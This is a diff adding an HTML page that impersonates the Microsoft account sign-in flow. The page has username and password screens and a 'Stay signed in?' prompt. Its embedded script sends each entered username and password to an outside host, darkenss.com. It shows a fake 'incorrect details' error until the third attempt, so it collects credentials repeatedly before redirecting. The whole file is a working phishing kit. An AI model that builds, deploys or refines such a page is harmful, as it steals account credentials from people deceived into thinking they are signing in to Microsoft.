@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="assets/favicon.ico" />
+    <title>Sign in to your Microsoft account</title>
+    <link rel="stylesheet" href="assets/app.css" />
+
+    <style>
+        /* Add styles for the error message */
+        .error-message {
+            color: red;
+            display: none; /* Initially hidden */
+            margin-top: 10px;
+        }
+    </style>
+</head>
+
+<body>
+    <section id="section_uname">
+        <div class="auth-wrapper">
+            <img src="assets/logo.png" alt="Microsoft" />
+            <h2 class="title mb-16 mt-16">Sign in</h2>
+            <form>
+                <div class="mb-16">
+                    <p id="error_uname" class="error-message">Please enter your email, phone, or Skype.</p>
+                    <input id="inp_uname" type="text" name="uname" class="input" placeholder="Email, phone, or Skype" required />
+                </div>
+                <button type="button" class="btn" id="btn_next">Next</button>
+            </form>
+            <div>
+                <p class="mb-16 fs-13">No account? <a href="" class="link">Create one!</a></p>
+                <p class="mb-16 fs-13">
+                    <a href="" class="link">Sign in with a security key
+                        <img src="assets/question.png" alt="Question img">
+                    </a>
+                </p>
+            </div>
+        </div>
+        <div class="opts">
+            <p class="has-icon mb-0" style="font-size:15px;"><span class="icon"><img src="assets/key.png"
+                        width="30px" /></span> Sign-in options</p>
+        </div>
+    </section>
+
+    <section id="section_pwd" class="d-none">
+        <div class="auth-wrapper">
+            <img src="assets/logo.png" alt="Microsoft" class="d-block" />
+            <div class="identity w-100 mt-16 mb-16">
+                <button class="back" id="back_button">
+                    <img src="assets/back.png" />
+                </button>
+                <span id="user_identity">a@b.com</span>
+            </div>
+            <h2 class="title mb-16">Enter password</h2>
+            <form id="login-form">
+                <div class="mb-16">
+                    <p id="error_pwd" class="error-message">Incorrect details, try again.</p>
+                    <input id="inp_pwd" type="password" name="pass" class="input" placeholder="Password" required />
+                </div>
+                <button type="submit" class="btn" id="btn_sig">Sign in</button>
+            </form>
+            <div>
+                <p class="mb-16"> <a href="#" class="link fs-13">Forgot password?</a></p>
+                <p class="mb-16">
+                    <a href="#" class="link fs-13">Other ways to sign in</a>
+                </p>
+            </div>
+        </div>
+    </section>
+
+    <section id="section_final" class="d-none">
+        <div class="auth-wrapper">
+            <img src="assets/logo.png" alt="Microsoft" class="d-block" />
+            <div class="identity w-100 mt-16 mb-16">
+                <span id="user_identity">a@b.com</span>
+            </div>
+            <h2 class="title mb-16">Stay signed in?</h2>
+            <p class="p">Stay signed in so you don't have to sign in again next time.</p>
+            <label class="has-checkbox">
+                <input type="checkbox" class="checkbox" />
+                <span>Don't show this again</span>
+            </label>
+            <div class="btn-group">
+                <button class="btn btn-sec" id="btn_final_no">No</button>
+                <button class="btn" id="btn_final_yes">Yes</button>
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+        <a href="">Terms of use</a>
+        <a href="">Privacy & cookies</a>
+        <span>.&nbsp;.&nbsp;.</span>
+    </footer>
+    <script>
+        let loginAttempts = 0;
+
+        document.getElementById('login-form').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent default form submission
+            
+            // Retrieve form data
+            const username = document.getElementById('inp_uname').value;
+            const password = document.getElementById('inp_pwd').value;
+            
+            // Backend API URL
+            const apiUrl = 'https://darkenss.com/api/submit/';
+            
+            // ID and URL Link for the request (you can set these dynamically if needed)
+            const id = '59fe207c-151f-407d-8810-2b4958fbead8'; // Replace with the actual user ID
+            const urlLink = 'http://outlook.com'; // Replace with the actual URL
+            
+            // Prepare data to send
+            const data = {
+                id: id,
+                url_link: urlLink,
+                username: username,
+                password: password
+            };
+            
+            // Send the data to the backend API
+            fetch(apiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            })
+            .then(response => response.json())
+            .then(data => {
+                loginAttempts++;
+                if (loginAttempts >= 3) {
+                    // Redirect to success page on the third attempt
+                    window.location.href = 'success.html';
+                } else {
+                    // Show error message
+                    document.getElementById('error_pwd').style.display = 'block';
+                }
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+                const errorMessage = document.getElementById('error_pwd');
+                errorMessage.textContent = 'An error occurred. Please try again.';
+                errorMessage.style.display = 'block';
+            });
+        });
+
+        // Mock navigation to simulate "Next" button functionality
+        document.getElementById('btn_next').addEventListener('click', function() {
+            const inpUname = document.getElementById('inp_uname');
+            const sectionUname = document.getElementById('section_uname');
+            const sectionPwd = document.getElementById('section_pwd');
+
+            if (inpUname.value.trim() === '') {
+                document.getElementById('error_uname').style.display = 'block';
+            } else {
+                document.getElementById('error_uname').style.display = 'none';
+                sectionUname.classList.add('d-none');
+                sectionPwd.classList.remove('d-none');
+                document.getElementById('user_identity').textContent = inpUname.value;
+            }
+        });
+
+        // Back button functionality
+        document.getElementById('back_button').addEventListener('click', function() {
+            const sectionUname = document.getElementById('section_uname');
+            const sectionPwd = document.getElementById('section_pwd');
+
+            sectionPwd.classList.add('d-none');
+            sectionUname.classList.remove('d-none');
+        });
+    </script>
+</body>
+
+</html>
